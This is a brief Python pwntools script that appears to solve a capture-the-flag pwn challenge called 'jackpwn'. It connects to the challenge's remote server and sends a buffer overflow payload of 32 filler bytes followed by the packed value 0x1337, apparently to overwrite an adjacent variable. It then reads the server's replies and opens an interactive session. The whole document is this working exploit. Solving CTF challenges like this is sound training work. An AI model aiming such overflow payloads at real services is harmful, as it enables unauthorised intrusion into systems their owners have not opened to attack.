from pwn import *
import time

p = remote("jackpwn-180.chall.ctf.bzh", 1337)

payload = b"A" * 32
payload += p64(0x1337)

p.sendline(payload)

print(p.recvline())

time.sleep(1)

print(p.recvline())

output = p.recv(1024)

print(output.decode())

p.interactive()
